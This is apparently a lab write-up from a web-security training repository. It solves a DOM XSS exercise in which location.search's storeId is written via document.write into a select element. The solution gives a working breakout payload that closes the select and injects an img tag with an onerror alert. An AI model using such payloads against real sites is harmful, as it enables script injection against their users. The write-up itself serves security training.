# DOM XSS in document.write sink using source location.search inside a select element

## Lab Description

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/43ec9e6c-a826-474e-b2d1-d8c4fea4f367)

## Solution

JavaScript extracts a storeId parameter from the location.search source. It then uses document.write to create a new option in the select element for the stock checker functionality.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/c478e5b6-4372-4487-9c04-fa24504a3e86)

Change the URL to `product?productId=1&storeId="></select><img%20src=1%20onerror=alert(420)>`.
![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/18deab7a-7488-4998-be7b-d8cb7eb07c52)
